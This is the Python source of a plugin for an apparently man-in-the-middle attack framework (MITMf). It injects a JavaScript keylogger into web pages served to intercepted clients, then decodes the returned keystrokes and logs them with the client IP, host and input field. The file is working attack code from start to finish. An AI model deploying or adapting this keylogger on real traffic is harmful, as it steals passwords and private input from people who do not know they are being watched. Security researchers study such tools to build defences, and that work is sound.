#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#
import logging
import re
import random
import string

from plugins.plugin import Plugin
from plugins.Inject import Inject

mitmf_logger = logging.getLogger("mitmf")

class jskeylogger(Inject, Plugin):
    name       = "JSKeylogger"
    optname    = "jskeylogger"
    desc       = "Injects a javascript keylogger into clients webpages"
    version    = "0.2"
    has_opts   = False

    def initialize(self, options):
        Inject.initialize(self, options)
        self.html_payload = self.msf_keylogger()

    def clientRequest(self, request):
        if 'keylog' in request.uri:
            request.printPostData = False

            raw_keys = request.postData.split("&&")[0]
            input_field = request.postData.split("&&")[1]

            keys = raw_keys.split(",")
            if keys:
                del keys[0]; del(keys[len(keys)-1])          

                nice = ''
                for n in keys:
                    if n == '9':
                        nice += "<TAB>"
                    elif n == '8':
                        nice = nice[:-1]
                    elif n == '13':
                        nice = ''
                    else:
                        try:
                            nice += n.decode('hex')
                        except:
                            mitmf_logger.error("{} [JSKeylogger] Error decoding char: {}".format(request.client.getClientIP(), n))

                mitmf_logger.info("{} [JSKeylogger] Host: {} | Field: {} | Keys: {}".format(request.client.getClientIP(), request.headers['host'], input_field, nice))

    def msf_keylogger(self):
        keylogger = open("./core/javascript/msfkeylogger.js", "r").read()

        return '<script type="text/javascript">\n' + keylogger + '\n</script>'
